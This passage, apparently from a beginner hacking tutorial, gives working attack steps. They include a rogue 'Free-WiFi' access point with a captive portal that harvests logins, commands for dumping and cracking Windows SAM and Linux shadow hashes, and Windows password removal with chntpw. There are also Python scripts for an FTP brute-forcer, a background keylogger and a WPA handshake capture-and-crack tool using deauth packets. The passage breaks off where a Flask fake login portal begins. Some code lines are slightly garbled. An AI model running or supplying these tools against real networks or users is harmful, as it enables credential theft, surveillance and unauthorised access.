+Now hostapd is running, check on another computer or phone to discover a wireless network with the SSID “Test-WiFi”.
+
+
+
+Provide Internet Access to the Access Point
+
+Once the AP is running, it’s a common scenario to share an internet connection from another interface. To do that, you can use bridge-utils to give internet from a bridge interface by typing the following commands:
+
+brctl addbr br0
+
+brctl addif br0 eth0
+
+ifconfig br0 up
+
+
+
+This will create a bridge between br0 and eth0. In my case, eth0 has internet access, so make sure to look for the interface that has internet with the ‘ifconfig’ command.
+
+The last step is to modify the hostapd.conf file using nano text editor.
+
+nano hostapd.conf
+
+
+
+
+
+And under the wireless interface wlan0 type bridge=br0.
+
+Save the file and restart the AP using:
+
+hostapd /root/hostapd.conf
+
+
+
+Now, the clients that will connect to the access point will have internet access.
+
+
+
+
+
+​
+
+
+
+
+
+​ Set Up a Captive Portal Login Page
+
+
+
+
+S tart up the Linux system and in the terminal type:
+
+apt install dnsmasq hostapd
+
+
+
+Then, figure out which wireless network device you will be using for the Access Point. Run the “iwconfig” command to see the available wireless network devices (wlan0, wlan1).
+
+
+
+Once you have identified your wireless interface, set up the configuration files using the nano text editor in the terminal.
+
+nano dnsmasq.conf
+
+
+
+And add the following lines.
+
+#Set the wireless interface
+
+interface=wlan0
+
+#Set the IP range for the clients
+
+dhcp-range=192.168.1.2,192.168.1.250,12h
+
+#Set the gateway IP address
+
+dhcp-option=3,192.168.1.1
+
+#Set DNS server address
+
+dhcp-option=6,192.168.1.1
+
+#Redirect all requests to 192.168.1.1
+
+address=/#/192.168.1.1
+
+
+
+This configuration file will tell dnsmasq to use the wlan0 interface and start handing out IP addresses to the clients.
+
+The last line will redirect all requests to the IP address 192.168.1.1. This is the address of your server hosting the captive portal page.
+
+When clients connected to the network try to access any website, their DNS requests are intercepted and redirected to the captive portal page, which is hosted on the server (192.168.1.1). Don’t forget to save the file.
+
+Next, I am going to create another configuration file, this time called hostapd.conf.
+
+nano hostapd.conf
+
+
+
+Add the following lines:
+
+#Set wireless interface
+
+interface=wlan0
+
+#Set network name
+
+ssid=Free-WiFi
+
+#Set channel
+
+channel=11
+
+#Set driver
+
+driver=nl80211
+
+
+
+In the configuration above, an Access Point is defined with the network name “Free-WiFi”, and it will run on channel 11, using wireless network interface wlan0.
+
+Save the file as hostapd.conf.
+
+At this point, you can start the access point using the following commands:
+
+dnsmasq -C /root/dnsmasq.conf
+
+hostapd /root/hostapd.conf
+
+
+
+
+
+You will also need to assign the IP address for the wlan0 interface using:
+
+ifconfig wlan0 192.168.1.1/24
+
+
+
+Copy the Captive Portal to the Web Server
+
+To set up a captive portal login page, you need to create or download a captive login page and copy the files to a location accessible by the web server.
+
+
+
+Here, you can see a basic HTML login page that will appear when clients try to connect to the access point.
+
+
+
+I am using Apache web server, so I need to copy the files to /var/www/html.
+
+The last step is to add rewrite rules to the Apache web server using nano text editor.
+
+nano /etc/apache2/sites-enabled/000-deafult.conf
+
+
+
+And under ‘VirtualHost’ add the following code:
+
+<Directory "/var/www/html">
+
+RewriteEngine On
+
+RewriteBase /
+
+RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
+
+RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
+
+RewriteCond %{REQUEST_FILENAME} !-f
+
+RewriteCond %{REQUEST_FILENAME} !-d
+
+RewriteRule ^(.*)$ / [L,QSA]
+
+</Directory>
+
+
+
+The rewrite rules above will make the redirection for the captive portal to work properly. Don’t forget to save the file and start the server using ‘ service apache2 start ’ in the terminal.
+
+Now, I will switch to a different computer and connect to the ‘Free-WiFi’ network.
+
+
+
+And I have been automatically redirected to the captive login page.
+
+
+
+
+
+​
+
+
+
+
+
+​ Capture Login Information from the Captive Portal using a PHP Script
+
+
+
+
+F irst, figure out where the captive portal files are located. In my case, the files are in /var/www/html . This is the location for the Apache web server.
+
+
+
+Here you can see the files. The ‘post.php’ is the script that will be used to capture the login information, and ‘capture.txt’ is the text file where the login credentials will be stored.
+
+Now let’s open ‘post.php’ using nano text editor.
+
+nano post.php
+
+
+
+
+
+Basically, this code will grab the username and the password from the login form and save them in a file called ‘capture.txt’.
+
+Next, you need to modify the index.html file and add the script.
+
+nano index.html
+
+
+
+
+
+Here, go to action, and after equal type “/post.php”. Don’t forget to save the file and restart the server using ‘ service apache2 restart’ .
+
+Now, if I connect to the Wi-FI network, I will be automatically redirected to the captive login page which looks like this.
+
+
+
+So, in the login form, I will type ‘John’ for the username and ‘letmein’ for the password and click “Login”.
+
+Let’s go back to /var/www/html location and open the capture.txt file using nano.
+
+nano capture.txt
+
+
+
+
+
+And here you can see the username and the password.
+
+
+
+
+
+​ Chapter 3: Password Hashing and Cracking
+
+
+
+
+P assword hashing is a process of using a hash function to convert a password into an unrecognizable series of characters like “1a1dc91c907325c69271ddf0c944bc72”.
+
+This makes it difficult for malicious actors to gain access to the password, as the characters are not readable. Even if a hacker gets access to the database, he will not be able to see the passwords in clear text.
+
+Now, if passwords are kept in clear text, anyone with internal access can see them. Not to mention that if the database gets breached, hackers would also see the credentials in plain/clear text.
+
+Storing in clear text means you’re directly tying your user’s identity to their password in a readable data format, as seen in the image below:
+
+
+
+If a hacker is able to break into the server, he will have access to all of the passwords. With this information, bad actors can take these login credentials and use them across websites other than your own.
+
+There’s no doubt that password hashing, compared to plain/clear text is an improvement in security.
+
+
+
+If a hacker gets access to the hashed passwords, he won’t be able to use them because they’re encrypted using different hashing algorithms.
+
+There are many hashing algorithms like MD5, SHA1, SHA256, and so on. For this example, I will generate a hash with the MD5 algorithm for the password “letmein123” using an online tool.
+
+
+
+4ca7c5c27c2314eecc71f67501abb724
+
+
+
+Here is the MD5 hash for “letmein123”. This is how the password will look in a database server instead of “letmein123”.
+
+Similarly, I will generate another hash for “letmein123”. This time, I will use the SHA256 algorithm.
+
+9b0eb22aef89516d6fb4b31ccf008a68abe0d10a3fc606316389613eccf96854
+
+
+
+And you can see the SHA256 hash for the password “letmein123”.
+
+Crack the Hashes
+
+The biggest problem with password hashing is that if you run a specific word like “letmein123” through a hashing algorithm, the hashed outcome for that word will always be the same.
+
+So, hashes can be reversed using methods such as dictionary attacks, which compares the given hash to the hashes of common words from a dictionary file. Now let’s see how to crack the hashes. To do that, I will use a site called “ crackstation.net ”.
+
+
+
+Here I will put both hashes, the MD5 and SHA256, then click “Crack Hashes”.
+
+
+
+And you can see the hashes have been successfully cracked.
+
+You can crack the hash if the password is short in length. To protect your password, use long words with digits and special characters, store them in a password manager, and don’t use the same password on different accounts.
+
+
+
+
+
+​ Crack Password Hashes with Hashcat
+
+
+
+
+H ashcat is the world’s fastest and most advanced password recovery tool that helps break complex password hashes. It is a flexible and feature-rich tool that offers many ways of finding passwords from hashes.
+
+For those who don’t know, password hashing is a process of using a hash function to convert a password into an unrecognizable series of characters like “1a1dc91c907325c69271ddf0c944bc72”.
+
+This makes it difficult for malicious actors to gain access to the password, as the characters are not readable.
+
+Install Hashcat
+
+Hashcat comes pre-installed in Kali Linux. To install it in Debian-based systems, use the following command:
+
+apt install hashcat
+
+
+
+Once the installation is done, you can check Hashcat’s help menu using the hashcat -h command in the terminal.
+
+Before cracking, let’s create some hashes to work with. There are many hashing algorithms like MD5, SHA1, SHA256, NTMLv2, and so on.
+
+For this example, I will generate two hashes: A MD5 hash and a SHA256 hash for the password “letmein456” using an online tool.
+
+0e88c5706dc5f028ac7c7d31d6cd1538 ==>MD5
+
+b59717793d432dd2c4edf0c960948ef581d8499393aaef6214a5fbd4cb1c2e3d ==>SHA256
+
+
+
+Here are the generated hashes for the password “letmein456”.
+
+Crack the Hashes
+
+In addition to Hashcat, you will also need a wordlist. A wordlist is a list of commonly used passwords in a text file. A popular password wordlist is rockyou.txt.
+
+It contains a list of commonly used passwords and is popular among pen testers. You can find the rockyou wordlist under /usr/share/wordlists in Kali Linux.
+
+Let’s crack the MD5 hash first by copying the hash into a text file using nano.
+
+nano md5hash.txt
+
+
+
+
+
+Then use the following command to crack the hash.
+
+hashcat -m 0 md5hash.txt rockyou.txt
+
+
+
+-m 0: MD5 hash mode. You can see all the codes on this page.
+
+md5hash.txt : is the txt file containing the hash.
+
+rockyou.txt: is the wordlist file.
+
+
+
+
+
+The hash was successfully cracked and is “letmein456”.
+
+Looks simple, doesn’t it. Now let’s crack the SHA256 hash. The hash mode value for SHA256 is 1400. Here is the command:
+
+hashcat -m 1400 sha256hash.txt rockyou.txt
+
+
+
+
+
+You can see that the status is “Cracked” and the “letmein456” password again. You can also crack multiple hashes by putting them in a text file.
+
+nano hash-list.txt
+
+
+
+
+
+Now run the following command.
+
+hashcat -m 1400 -a 0 hash-list.txt rockyou.txt -o cracked.txt
+
+
+
+– hash-list.txt: is the text file containing multiple hashes.
+
+– cracked.txt: is the output text file for the cracked hashes.
+
+
+
+To check the cracked hashes, use the “cat” command in the terminal.
+
+cat cracked.txt
+
+
+
+
+
+Here you can see I have cracked three hashes.
+
+Hashcat is a powerful tool that helps you to crack password hashes. To enforce security and protect hashes from attacks, use strong passwords with digits and special characters.
+
+
+
+
+
+​ Crack Windows Passwords with John the Ripper
+
+
+
+
+J ohn the Ripper is an offline password-cracking tool designed to test password strength, brute-force encrypted (hashed) passwords, and crack passwords via dictionary attacks. Simply put, John cracks passwords.
+
+Extract Hashes from Windows
+
+The first thing you need to do is to grab the password hashes from the SAM file. Security Account Manager (SAM) is a database file in Windows 10/8/7 that stores user passwords in encrypted form, which could be located in the following directory:
+
+C:\Windows\system32\config
+
+
+
+To extract the SAM files, open a command prompt (cmd) on the Windows machine and type the following commands:
+
+reg.exe save hklm\sam C:\sam.save
+
+reg.exe save hklm\system C:\system.save
+
+
+
+These commands will grab the password hashes from your current system and save it to the C:\ drive.
+
+
+
+Now you need to copy those two files (sam.save, system.save) and switch to the Kali Linux machine or other Linux distribution, and paste the files on the Desktop.
+
+
+
+To see the hashes from the files, I will use the following command in the terminal.
+
+impacket-secretsdump -sam sam.save -system system.save LOCAL
+
+
+
+
+
+Here you can see the accounts and the hashes. In my case, I will choose to crack the password for user “John”.
+
+
+
+To do that, I will copy the hash (4b73ab495e53411975629cebebc9621c) and create a new text file using the nano text editor.
+
+nano johnhash.txt
+
+
+
+
+
+And paste the hash here. Don’t forget to save the file.
+
+Crack the Password
+
+In this step, I will use John the Ripper in wordlist mode to crack the user password. In this mode, John can read passwords from a text file that you provide.
+
+For this example, I will use the rockyou wordlist. To start the cracking process, use the following command.
+
+john—format=NT—wordlist rockyou.txt johnhash.txt
+
+
+
+rockyou.txt is the wordlist file from Kali Linux.
+
+johnhash.txt is the text file where I have put the hash from user “John” using nano.
+
+
+
+
+
+Here, you can clearly see that John the Ripper has cracked the password and is “letmein”.
+
+John the Ripper is probably the world’s best-known password cracking tool. It is often used by penetration testers and black hat hackers for its versatility and ease of use.
+
+
+
+
+
+​ Crack Linux Passwords with John the Ripper
+
+
+
+
+W hen you create a user account in Linux and set a password, your system doesn’t store the password in plain text. Instead, it stores the hash in a file called /etc/shadow.
+
+This file is readable only by the root user, and each line contains a username and their hashed password, like this:
+
+newuser:$y$j9T$vsFOgjanE/bchXfDigS/G.$AhWziPaBF1N1l.GaH7dnrXe7wGN9YW5u09NF0V602RC:...
+
+
+
+That long string starting with $y$ is the actual password hash, and in this case, it’s using the yescrypt hashing algorithm (used in modern Linux systems by default).
+
+Extracting and Cracking the Hash
+
+To get the hash, you’ll need to open the /etc/shadow file using the following command:
+
+cat etc/shadow
+
+
+
+
+
+Look for a line that starts with your target username. In this example, I will select “newuser”.
+
+Next, copy just the hash part (everything after the colon and before the next colon) and paste it into a text file using nano terminal text editor.
+
+nano hash.txt
+
+
+
+
+
+Then use the following command to crack the hash.
+
+john—format=crypt hash.txt—wordlist=passwords.txt
+
+
+
+● hash.txt: is the txt file containing the hash.
+
+
+
+● passwords.txt:is the wordlist file.
+
+
+
+John will start trying all the passwords in your wordlist against the hash. If the real password is in the list, it’ll crack it and show you something like:
+
+
+
+The hash was successfully cracked, and the password is “letmein123”.
+
+
+
+
+
+​ Crack Password Protected ZIP Files
+
+
+
+
+I ‘m going to show you how to crack password-protected ZIP files using a tool called “fcrackzip”.
+
+Fcrackzip is a tool that can be used to decrypt zip files and determine their passwords. It is able to crack password-protected zip files with brute force or dictionary-based attacks.
+
+Installation
+
+Fcrackzip can be installed using the following command.
+
+apt install fcrackzip
+
+
+
+At this point, you can access the help menu of the tool by typing “fcrackzip – help” in the terminal.
+
+
+
+Create a ZIP File that is Password Protected
+
+To begin, I must generate a password-protected file. To do that, I will use the following commands.
+
+touch secretinfo.txt
+
+zip—password 12345678 secretinfo.zip secretinfo.txt
+
+
+
+The first command will create a text file called secretinfo, and the second command will generate a password-protected ZIP file with the password “12345678”, and the name of the file will be “secretinfo.zip” in my case. You can use the ‘ls’ command to see the ZIP file.
+
+
+
+Cracking the Password with a Dictionary
+
+In this mode, fcrackzip can read passwords from a text file that you provide, the password must be contained in the dictionary file you are using.
+
+If it is not in the dictionary, then fcrackzip will be unable to determine the key. Use the command below to crack the password.
+
+fcrackzip -D -p /home/frost/rockyou.txt -u secretinfo.zip
+
+
+
+Let’s break down the command:
+
+● -D to specify you are using a dictionary or wordlist.
+
+● -p to specify the password file.
+
+● - /home/frost/rockyou.txt is the path/location for the dictionary file. In my case, I’m using ‘rockyou.txt’.
+
+● -u to use unzip
+
+● -secretinfo.zip is the password-protected ZIP file.
+
+
+
+Once you have set up the command, press “Enter” to start the cracking process.
+
+
+
+Here you can see the password was found.
+
+
+
+
+
+​ Bypass Windows Passwords using Kali Linux
+
+
+
+
+I n this chapter, you’re going to learn how to reset/remove forgotten passwords on any Windows computer.
+
+Using this method, you can unlock any Windows device without knowing the user password and without formatting the hard disk.
+
+To perform this experiment, I will use a little program called chntpw. This chntpw can remove the password of a user in Windows SAM files, even this program can edit the Windows registry. The tool comes pre-installed by default in Kali Linux.
+
+Make Bootable USB of Kali Linux
+
+When you’re locked out of Windows, you need to use another computer to make a Kali bootable USB. Please follow the steps listed below.
+
+● Download the ISO image of Kali Linux . It’s free.
+
+● Next, you’ll need a program to install Kali on your USB drive and make it bootable. I will use Rufus . Just download and install it on your local PC.
+
+● Start the Rufus utility and browse to locate your Kali Linux image.
+
+● Click Start to create a Kali Live USB drive.
+
+
+
+After successfully creating a bootable USB, plug it into the USB port of your Windows computer and boot from the USB.
+
+You may have to press a special key (e.g., Esc, F2, F12, Del, etc.) during bootup to get the computer to boot from the USB instead of the hard drive.
+
+Remove Windows Password
+
+Here I have entered into the Kali Linux operating system.
+
+
+
+Click on the “File System” and open it. After opening it, select the drive of the Window machine where Windows is installed.
+
+
+
+After that, right-click on a blank space in this location, and select open terminal here, then go to “/Windows /System32/config/” using the cd command. Now you have reached the place where the Windows password file is kept.
+
+List Users
+
+Use the following command to find all existing users on the Windows machine.
+
+chntpw -l SAM
+
+
+
+
+
+Select the user whose password you want to remove. In my case is “Workgroup”. Just replace the username and execute the following command.
+
+chntpw -u Workgroup SAM
+
+
+
+
+
+After executing the command, it shows you different options. All you have to do is proceed by selecting option 1 “Clear (blank) user password” to remove the Windows password.
+
+
+
+Then press “q” and “y” to save the changes.
+
+At this point, you can reboot your computer and unplug the USB drive, you’ll see there’s no password required to log in. I hope this will be helpful if you ever need to reset/remove a Windows password.
+
+
+
+
+
+​ Chapter 4: Python Scripting
+
+
+
+
+P ython is the language that every cybersecurity expert relies on. It’s practical, powerful, and everywhere in the hacking world. So, let’s see some reasons why hackers love Python:
+
+● Easy to Learn: Even if you’ve never written a single line of code, Python is one of the easiest programming languages to learn. Its syntax reads almost like English, which makes it perfect for beginners in cybersecurity.
+
+
+
+● Build Your Own Tools: Want to write a port scanner, a brute force script, or a tool that listens to network traffic? You can do it all in Python, often with just a few lines of code.
+
+
+
+● Tons of Hacking Libraries: Need to scan a network? Crack passwords? There’s probably a Python library for that. Tools like scapy, socket, requests, and nmap give you superpowers with just a few lines of code.
+
+
+
+● Automate Everything: Tired of running the same commands over and over? Python can automate scanning networks, scraping websites, testing passwords, or parsing logs.
+
+
+
+W riting a Basic Port Scanner
+
+Let’s say you want to check if certain ports are open on a device in your network. Instead of relying on someone else’s tool, here’s how you could write your own:
+
+import socket
+
+target = "192.168.52.131"
+
+ports = [21, 22, 80, 443]
+
+print(f"Scanning {target}...\n")
+
+for port in ports:
+
+sock = socket.socket()
+
+result = sock.connect_ex((target, port))
+
+if result == 0:
+
+print(f"[+] Port {port} is OPEN")
+
+else :
+
+print(f"[-] Port {port} is CLOSED")
+
+sock.close()
+
+
+
+This little script is a basic port scanner. It checks if certain ports (like 21 for FTP, 22 for SSH, 80 for HTTP, and 443 for HTTPS) are open on a device with the IP address 192.168.52.131.
+
+So, in less than 15 lines, you’ve built something useful, and that’s the power of Python.
+
+To run the port scanner, just save the code in a file, for example, call it port_scanner.py. Then, open your terminal, navigate to the folder where the file is saved, and run:
+
+python3 port_scanner.py
+
+
+
+
+
+Once you run it, the script will start checking each port and tell you which ones are open or closed.
+
+
+
+
+
+​ Network Scanner with OS Detection
+
+
+
+
+I n this lesson, you’ll build a network scanner that will try to guess the operating system of a device and scan the most common ports (1–1024) to see which ones are open. Let’s get started.
+
+First off, I will create a new file using the nano terminal text editor.
+
+nano network_scanner.py
+
+
+
+Add the following code:
+
+import socket
+
+import scapy.all as scapy
+
+def guess_os(ttl):
+
+if ttl >= 128:
+
+return "Windows"
+
+elif ttl >= 64:
+
+return "Linux/Unix"
+
+return "Unknown"
+
+def detect_os(ip):
+
+pkt = scapy.IP( dst =ip) / scapy.ICMP()
+
+reply = scapy.sr1(pkt, timeout =2, verbose =0)
+
+return guess_os(reply.ttl) if reply else "OS could not be detected"
+
+def scan_ports(ip):
+
+print(f"\n[+] Scanning ports on {ip}...\n")
+
+try:
+
+for port in range(1, 1025): # Scan ports 1-1024
+
+with socket.socket() as sock:
+
+sock.settimeout(0.3)
+
+if sock.connect_ex((ip, port)) == 0:
+
+print(f"[+] Port {port} is OPEN")
+
+except KeyboardInterrupt:
+
+print("\n[!] Scan stopped by user.")
+
+def main():
+
+print("Port & OS Scanner\n")
+
+ip = input("Enter IP address to scan: ").strip()
+
+print("\n🔍 Detecting OS...")
+
+print(f"[+] OS Guess: {detect_os(ip)}")
+
+scan_ports(ip)
+
+if __name__ == "__main__":
+
+main()
+
+
+
+T his script combines two essential tasks in ethical hacking: identifying a system's operating system and scanning its ports.
+
+Run the Script
+
+Save the script to a file (scanner.py). Then open your terminal, navigate to the folder where the script is saved, and run it with:
+
+python3 scanner.py
+
+
+
+
+
+You’ll be asked to enter an IP address, just type the one you want to scan. The script will then try to detect the operating system and check which ports are open.
+
+
+
+
+
+​ Build an FTP Cracker
+
+
+
+
+I n this lesson, you'll learn how to build a simple FTP brute-force password cracker using Python. For this example, I'll be targeting a test FTP server running vsftpd, which is a popular FTP server often used in practice environments.
+
+I’ll use a list of possible passwords (called a wordlist) and try logging in with each one to see if I can find the right one. Let’s get started.
+
+Create a file called “ftpcracker.py” using the nano text editor.
+
+nano ftpcracker.py
+
+
+
+Add the following code:
+
+from ftplib import FTP
+
+target = "192.168.1.100"
+
+username = "admin"
+
+wordlist = "passwords.txt"
+
+with open(wordlist, "r") as file:
+
+passwords = file.readlines()
+
+for password in passwords:
+
+password = password.strip()
+
+try :
+
+ftp = FTP(target)
+
+ftp.login(user=username, passwd=password)
+
+print(f"[+] Login successful! Password found: {password}")
+
+ftp.quit()
+
+break
+
+except :
+
+print(f"[-] Failed login with: {password}")
+
+
+
+This Python script connects to an FTP server (you'll provide the IP address), and repeatedly tries to log in using the same username (admin) but different passwords from a file called passwords.txt. The script tries each password one by one until it either finds a working one or finishes the list.
+
+Run the Script
+
+Save your password guesses in a file named passwords.txt and replace 192.168.1.100 in the script with the actual IP address of the FTP server.
+
+Then run the following command:
+
+python3 ftpcracker.py
+
+
+
+
+
+The script is trying out different passwords to log into an FTP server.
+
+It starts testing passwords from a list like “123456789” and “mypassword32”, but those attempts fail.
+
+Eventually, it finds the correct one: “letmein123”, and prints a success message to let you know it worked.
+
+
+
+
+
+​ Create a Keylogger using Python
+
+
+
+
+A keylogger (or keystroke logger) is a type of software that monitors and records what you type on your computer or mobile phone.
+
+Keyloggers are often used for monitoring network usage and troubleshooting technical problems. On the other hand, a lot of malicious software uses keyloggers to get login information and other private data.
+
+Install Pynput
+
+First, you need to install a particular library called pynput. To install pynput, type the following command in the terminal.
+
+pip3 install pynput
+
+
+
+The pynput library provides the ability to monitor and control input devices, primarily the keyboard. It allows you to listen for input events, such as key presses.
+
+Python Keylogger
+
+To create the keylogger, I will use nano terminal text editor by typing:
+
+nano keylogger.py
+
+
+
+And add the following code:
+
+rom pynput.keyboard import Key, Listener
+
+import logging
+
+logging.basicConfig(filename=("capture.txt"), level =logging.DEBUG, format =" %(asctime)s - %(message)s")
+
+def on_press(key):
+
+logging.info(str(key))
+
+with Listener( on_press =on_press) as listener :
+
+listener.join()
+
+
+
+I won’t bore you with technical explanations. So, this code creates a simple keylogger that captures key presses (everything you type on the keyboard) and saves them to a text file called “capture.txt”.
+
+It uses the pynput library for keyboard monitoring and the logging module for writing log messages to a file.
+
+Now, save the file and start the keylogger script using the following command.
+
+nohup python3 keylogger.py &
+
+
+
+
+
+This command will let the script run even after the terminal closes while still recording all the keystrokes. After launching the keylogger, you should see a new file called “capture.txt” created in the current directory.
+
+
+
+This is the file that will contain all of the recorded keystrokes. For example, I will type “Keylogger test!” in the terminal.
+
+
+
+Now let’s open the “capture.txt” file using the nano text editor.
+
+nano capture.txt
+
+
+
+
+
+Here you can see the keylogger is recording all the keystrokes. If you want to stop the keylogger, use the command “kill” and the PID number.
+
+kill 4575
+
+
+
+In my case, the PID number for the keylogger process is”4575”. You will see your number in the terminal after launching the script.
+
+
+
+
+
+​ Create a Custom Wordlist
+
+
+
+
+I n this step, you’ll learn how to build a custom wordlist generator with options for minimum and maximum characters. A wordlist is a list of commonly used passwords in a big text file.
+
+As I mentioned before, a popular password wordlist is rockyou.txt. You can find the rockyou wordlist under /usr/share/wordlists in Kali Linux. Now let’s get started.
+
+I will create a new file.
+
+nano wordlist-generator.py
+
+
+
+Add the following code:
+
+import itertools
+
+import argparse
+
+import sys
+
+def generate_wordlist (charset, min_length, max_length, output_file):
+
+"""
+
+Generate a wordlist with the given character set and length range.
+
+"""
+
+try :
+
+total_words = sum(len(charset) ** length for length in range(min_length, max_length + 1))
+
+with open(output_file, "w") as f:
+
+word_count = 0
+
+for length in range(min_length, max_length + 1):
+
+for combination in itertools.product(charset, repeat=length):
+
+word = ''.join(combination)
+
+f.write(word + '\n')
+
+word_count += 1
+
+# Update progress bar
+
+progress = int((word_count / total_words) * 50)
+
+sys.stdout.write(f"\r[{'=' * progress}{' ' * (50 - progress)}] {word_count}/{total_words} words")
+
+sys.stdout.flush()
+
+print("\n[+] Wordlist generation complete.")
+
+print(f"[+] {word_count} words saved to '{output_file}'.")
+
+except Exception as e:
+
+print(f"[!] Error writing to file: {e}")
+
+
+
+Part 1: What This Code Does:
+
+This function is the heart of the script. It takes:
+
+● A set of characters (charset).
+
+● A minimum and maximum length.
+
+● And the name of an output file.
+
+
+
+Then it generates every possible combination of characters within that length range, and saves them line-by-line into the file. This is how password wordlists are made.
+
+Part 2: Taking User Input and Running the Generator
+
+if __name__ == "__main__":
+
+parser = argparse.ArgumentParser( description ="Generate a wordlist.")
+
+parser.add_argument("-c", "—charset", required =True, help ="Character set to use, e.g., abc123!@#")
+
+parser.add_argument("-min", "—min_length", type =int, required =True, help ="Minimum word length")
+
+parser.add_argument("-max", "—max_length", type =int, required =True, help ="Maximum word length")
+
+parser.add_argument("-o", "—output", required =True, help ="Output file for the wordlist")
+
+args = parser.parse_args()
+
+try:
+
+charset = args.charset
+
+min_length = args.min_length
+
+max_length = args.max_length
+
+if min_length > max_length:
+
+raise ValueError("Minimum length cannot be greater than maximum length.")
+
+print(f"[+] Starting wordlist generation...")
+
+generate_wordlist(charset, min_length, max_length, args.output)
+
+except Exception as e:
+
+print(f"[!] Error: {e}")
+
+
+
+This section is like the control center for the script. It uses argparse to collect inputs from the user through command-line flags:
+
+● -c for characters to use.
+
+● -min and -max for word lengths.
+
+● -o for output file name.
+
+
+
+Then it checks that the inputs make sense and starts the wordlist generation by calling the function from Part 1.
+
+Run the Script
+
+Copy the code from Part 1 and Part 2 into a single Python file (wordlist-generator.py). Then use the following command:
+
+python3 wordlist-generator.py -c abc123 -min 4 -max 6 -o wordlist.txt
+
+
+
+● -c abc123: Specifies the character set (e.g., letters, numbers)
+
+● -min 4: Minimum length of the words in the list.
+
+● -max 6: Maximum length of the words in the list.
+
+● -o wordlist.txt: Name of the output file to save the generated wordlist.
+
+
+
+
+
+The wordlist will be saved in the specified file (wordlist.txt), containing all possible combinations of the given character set within the length range.
+
+The output:
+
+[+] Starting wordlist generation...
+
+[============================== ] 7000/101507 words
+
+[======================================] 101507/101507 words
+
+[+] Wordlist generation complete.
+
+[+] 101507 words saved to 'wordlist.txt'.
+
+
+
+You can use the “ls” command to see the wordlist text file.
+
+Example Use Case
+
+Imagine you are testing the security of a Wi-Fi network, and you know the password contains a mix of lowercase letters, numbers, and a few symbols. You can generate a wordlist with the following command:
+
+python3 wordlist-generator.py -c abc123!@# -min 8 -max 12 -o wordlist.txt
+
+
+
+This will create all possible combinations of passwords with 8, 9, 10, 11, and 12 characters using a, b, c, 1, 2, 3, !, @, and #.
+
+The output will be saved to a file named wordlist.txt, which you can then use with tools like Hashcat to crack the Wi-Fi password.
+
+
+
+
+
+​ Automate WiFi Hacking with Python
+
+
+
+
+N ow, I’m going to show you how to create a Python script that can crack WiFi passwords. The script will capture the WPA/WPA2 handshake and then crack it using the provided wordlist file.
+
+Part 1: The Python Script
+
+I will create a new file by using the nano terminal text editor.
+
+nano wifi-cracker.py
+
+
+
+Add the following code:
+
+import subprocess
+
+import time
+
+import os
+
+import re
+
+# Validate the BSSID format (must look like 00:11:22:33:44:55)
+
+def is_valid_bssid (bssid):
+
+return re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid) is not None
+
+# Captures a handshake using airodump-ng and aireplay-ng
+
+def capture_handshake (interface, bssid, channel, output_prefix):
+
+if not is_valid_bssid(bssid):
+
+print("Error: Invalid BSSID format.")
+
+return
+
+# Run airodump-ng to monitor the target network
+
+airodump_cmd = ['airodump-ng', '—bssid', bssid, '—channel', channel, '-w', output_prefix, interface]
+
+airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+try :
+
+time.sleep(5) # Let airodump-ng initialize
+
+print("Sending deauth packets to capture the handshake...")
+
+# Send 10 deauth packets to force clients to reconnect
+
+deauth_cmd = ['aireplay-ng', '—deauth', '10', '-a', bssid, interface]
+
+subprocess.run(deauth_cmd)
+
+print("Waiting to capture the handshake...")
+
+time.sleep(30) # Allow time for the handshake to be captured
+
+finally :
+
+airodump_proc.terminate()
+
+
+
+In this first part, the script captures the WPA/WPA2 handshake from a Wi-Fi network. This is a common hacking step that allows you to later attempt to crack the Wi-Fi password using a wordlist.
+
+Part 2: Cracking the Captured Handshake
+
+# Cracks the captured handshake with aircrack-ng
+
+def crack_handshake (handshake_file, wordlist_file):
+
+if not os.path.isfile(handshake_file):
+
+print(f"Error: Handshake file '{handshake_file}' not found.")
+
+return
+
+try :
+
+subprocess.run(['aircrack-ng', '-w', wordlist_file, handshake_file])
+
+except Exception as e:
+
+print(f"An error occurred: {str(e)}")
+
+# Simple command-line menu and user inputs
+
+def main ():
+
+print("WPA WiFi Cracker")
+
+print("====================")
+
+print("1. Capture and crack WPA handshake")
+
+print("2. Exit")
+
+choice = input("Enter your choice: ")
+
+if choice == "1":
+
+interface = input("Enter your wireless interface (e.g., wlan0): ")
+
+bssid = input("Enter the BSSID of the target network: ")
+
+if not is_valid_bssid(bssid):
+
+print("Error: Invalid BSSID format.")
+
+return
+
+channel = input("Enter the network's channel: ")
+
+output_prefix = input("Enter a name for the output file: ")
+
+wordlist_file = input("Enter the path to your wordlist file: ")
+
+capture_handshake(interface, bssid, channel, output_prefix)
+
+handshake_file = f"{output_prefix}-01.cap"
+
+print(f"Captured handshake file: {handshake_file}")
+
+crack_handshake(handshake_file, wordlist_file)
+
+else :
+
+print("Exiting...")
+
+if __name__ == "__main__":
+
+main()
+
+
+
+In this part, the script takes the captured handshake file and runs it against a wordlist using aircrack-ng. This is a brute-force approach where it tries passwords from the list until one works.
+
+Run the Script
+
+Save the code from Part 1 and Part 2 into a file (e.g., wifi-cracker.py). Open a terminal and navigate to the directory containing the script and type:
+
+python3 wifi-cracker.py
+
+
+
+
+
+Choose option 1 to capture and crack the handshake.
+
+
+
+Then provide the wireless interface. You can use “Iwconfig” to find the wireless interface name.
+
+
+
+Next, you need to put the router's MAC address and channel. To do that, use the “airodump-ng wlan0” command in another terminal to scan nearby wireless networks and find your target.
+
+In my case, I will use my own network called “SkyNet” with the BSSID or MAC address 58:D0:61:FB:94:20.
+
+
+
+Here, type the file name where the 4-way handshake will be stored (data). The 4-way handshake is the process of exchanging 4 messages between an access point and the client device.
+
+If you can grab the 4-way handshake, you can then attempt to crack it and reveal the password. Lastly, provide the wordlist file path.
+
+
+
+At this point, the attack is running...
+
+
+
+Here you can see the password was found and is “Letmein321”.
+
+Remember, the passphrase must be contained in the wordlist file you are using to break the WPA/WPA2 wifi password. If it is not in the wordlist, then aircrack-ng will be unable to find the key.
+
+
+
+
+
+​ Fake Captive Portal (Flask)
+
+
+
+
+I n this step, you're going to create a simple Flask web app that acts like a "Free Wi-Fi Login" page. When someone accesses the captive portal web page and enters a username and password, their login information will be saved in a text file.
+
+Create a new file by using the nano terminal text editor.
+
+nano fake_captive_portal.py
+
+
+
+Add the following code:
+
+# fake_captive_portal.py
+
